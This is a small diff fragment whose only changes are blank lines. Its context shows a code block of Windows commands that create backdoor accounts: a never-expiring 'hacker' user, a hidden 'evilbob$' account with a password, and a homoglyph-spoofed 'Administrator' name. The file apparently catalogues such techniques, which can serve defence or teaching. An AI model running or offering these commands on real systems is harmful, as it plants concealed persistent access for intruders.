@@ -41,3 +41,5 @@ net user hacker /Expires:Never
 net user /add evilbob$ evilpassword
 Aԁmіnistratοr
 ```
+
+
